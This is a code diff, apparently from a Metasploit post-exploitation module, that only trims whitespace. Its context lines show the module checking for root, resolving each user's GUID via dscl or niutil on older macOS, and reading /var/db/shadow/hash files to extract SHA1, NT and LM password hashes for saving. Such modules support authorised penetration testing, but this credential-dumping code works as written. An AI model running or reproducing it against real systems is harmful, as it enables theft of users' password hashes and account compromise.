@@ -118,7 +118,7 @@ class Metasploit3 < Msf::Post
 	def check_root
 		# Get only the account ID
 		id = cmd_exec("/usr/bin/id","-ru").chomp
-		
+
 		if id == "0"
 			return true
 		else
@@ -141,7 +141,7 @@ class Metasploit3 < Msf::Post
 		users = []
 		nt_hash = nil
 		host,port = session.tunnel_peer.split(':')
-		
+
 		# Path to files with hashes
 		nt_file = ::File.join(log_folder,"nt_hash.txt")
 		lm_file = ::File.join(log_folder,"lm_hash.txt")
@@ -232,20 +232,15 @@ class Metasploit3 < Msf::Post
 		# Process each user
 		users.each do |user|
 			if ver_num =~ /10\.(6|5)/
-				
 				guid = cmd_exec("/usr/bin/dscl", "localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
-				
 			elsif ver_num =~ /10\.(4|3)/
-		
 				guid = cmd_exec("/usr/bin/niutil","-readprop . /users/#{user} generateduid").chomp
-				
 			end
 
 			# Extract the hashes
 			sha1_hash = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
 			nt_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
 			lm_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
-			
 
 			# Check that we have the hashes and save them
 			if sha1_hash !~ /00000000000000000000000000000000/
